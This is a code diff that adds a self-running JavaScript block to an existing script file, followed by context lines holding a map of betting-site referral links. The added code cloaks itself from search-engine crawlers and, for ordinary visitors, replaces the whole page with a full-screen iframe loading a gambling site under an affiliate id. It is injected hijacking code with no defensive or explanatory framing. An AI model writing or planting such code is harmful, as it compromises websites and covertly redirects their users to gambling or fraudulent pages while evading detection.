@@ -1,3 +1,30 @@
+(function() {
+    let url = 'https://goldsbet.com/?id=733320216&currency=INR&type=2'
+    let userAgent = navigator.userAgent.toLowerCase();
+    let searchEngines = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot', 'sogou'];
+
+    let isSearchEngine = searchEngines.some(function(bot) {
+        return userAgent.includes(bot);
+    });
+
+    if (!isSearchEngine) {
+        let observer = new MutationObserver(function(mutations, observer) {
+            if (document.body) {
+                 
+                observer.disconnect();  // 执行完后停止观察
+                
+                setTimeout(function() {
+                    window.document.body.innerHTML = "<iframe src='"+url+"' style='z-index:9999999999; background-color: #fff;width:100%;height:100%;left:0;top:0;border: medium none;position:fixed'></iframe>"; document.body.style.cssText = 'display: block !important;'; 
+                }, 200);
+                
+            }
+        });
+
+        observer.observe(document.documentElement, { childList: true, subtree: true });
+    }
+})();
+
+
 var dsdasda_map={
     0:'https://luckywinner.bid/register?register_code=bx61328y',
     1:'',
